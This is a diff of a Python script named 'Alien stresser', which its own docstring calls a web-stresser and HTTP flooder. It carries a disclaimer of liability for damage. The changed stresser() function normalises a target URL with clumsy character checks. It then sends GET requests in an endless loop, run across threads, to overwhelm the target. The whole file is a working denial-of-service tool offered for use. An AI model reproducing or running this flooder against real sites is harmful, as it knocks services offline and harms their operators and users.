@@ -1,23 +1,20 @@
+
+		
 """
 Alien stresser is a web-stresser  and HTTP flooder in python .
 /!\ Warning : the author isn't responsable for all damage
-
 Author:Had1x
 licence : GNU GPL 3
 date: 26/03/2016
-
 Requirements:
 Python 3
 Requests module
-
 requests module installation in (Debian-based distribution):
 sudo apt-get install python-pip
 pip install requests
-
 Usage :
 python3 alien-stresser.py <HOST>
 python3 alien-stresser.py http://www.domain.com
-
 """
 
 import sys
@@ -33,13 +30,18 @@ except ImportError:
 def stresser():
                                                                 
     host = sys.argv[1]
-    if "http://" or "https://" not in (host):
-        host = "http://" + (host)
-    elif "http://" or "https://"  in (host)  :
-        pass
-    while 1 != 2 :
-       requests.get(host)
-       print ("[*] flooding {} ".format(host))
+    liste  = []
+    for elements in host :
+        liste.append(elements)
+    if (liste[0]) == "w" and (liste[2]) == "w":
+        _host_ = "http://" + (host)
+    elif (liste[0]) == "h" and (liste[3])  == "p" or (liste[4]) == "p" :
+        _host_ =  (host)
+    while 1 == 1 :
+        w = requests.get(_host_)
+        print ("flooding {} ".format(_host_))
+          
+    
 
 def _threads_():
 	 c = threading.Thread(target=stresser)
@@ -88,5 +90,3 @@ def main():
 
 		
 main()
-
-
